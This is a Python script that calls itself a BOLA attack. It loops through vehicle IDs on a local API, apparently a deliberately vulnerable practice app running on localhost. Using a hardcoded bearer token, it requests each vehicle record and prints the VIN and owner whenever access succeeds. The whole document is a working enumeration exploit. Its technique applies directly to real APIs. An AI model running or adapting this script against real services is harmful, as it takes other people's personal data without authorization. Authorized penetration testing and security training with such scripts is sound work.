#!/usr/bin/env python3
import requests
import json

target = "http://localhost:8888"
token = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZWR0ZWFtQGhhY2tlci5jb20iLCJpYXQiOjE3Nzc1Njg1NDksImV4cCI6MTc3ODE3MzM0OSwicm9sZSI6InVzZXIifQ.K_CL2EMNv6th2e5xIN0TBFxOJv1Vd1I7xCY2Q3kayW-nkcPacfJZtwi4o-tYLWGbCiakk1x38m0RAw--TlGzxfrYnZLT9RCSSYD4lm-R-z7KK-vrKWoCL6WBcx6Xl_vee6pfzMeZEBbHU11qTcG85JZpO-HdbemSibohHnYXB8lMoAD_1TrFQLCHy30aYoXSILQX26w1LCMsnVWx0V_mwuSm10vyJfUfs3uiuDN4qtbsx4KDQG9G7Wfb6iGfTnOuR90jZmdbNuJNugIBEgPIF1CyHd4UkmWrjmNfz6ufRW9NDCkHtY3ZQv-pTTzrBNTVZtyCZDHqHDh8tlHQUJsLOg"

headers = {"Authorization": f"Bearer {token}"}

print("="*70)
print("[*] BOLA (Broken Object Level Authorization) Attack")
print("[*] Testing unauthorized access to other vehicles")
print("="*70)

my_vehicle_id = 6
vulnerable = []

print(f"\n[+] My Vehicle ID: {my_vehicle_id}")
print(f"[+] Testing Vehicle IDs 1-20...\n")

for vid in range(1, 21):
    # 차량 상세 정보
    url = f"{target}/identity/api/v2/vehicle/{vid}"
    r = requests.get(url, headers=headers)
    
    if r.status_code == 200:
        print(f"  [🔥 VULN!] Vehicle {vid}: Unauthorized access SUCCESS!")
        data = r.json()
        print(f"           VIN: {data.get('vin', 'N/A')}")
        print(f"           Owner: {data.get('owner', 'N/A')}")
        vulnerable.append(vid)
    elif r.status_code == 403:
        print(f"  [✓] Vehicle {vid}: Properly protected")
    elif r.status_code == 404:
        print(f"  [-] Vehicle {vid}: Not found")
    elif r.status_code == 401:
        print(f"  [!] Vehicle {vid}: Unauthorized (token issue)")
    else:
        print(f"  [?] Vehicle {vid}: Status {r.status_code}")

print("\n" + "="*70)
print(f"[*] Summary:")
print(f"    Total vehicles tested: 20")
print(f"    Vulnerable vehicles: {len(vulnerable)}")
if vulnerable:
    print(f"    IDs with unauthorized access: {vulnerable}")
    print(f"\n[🚨] BOLA VULNERABILITY CONFIRMED!")
else:
    print(f"    No unauthorized access (API properly secured)")
print("="*70)
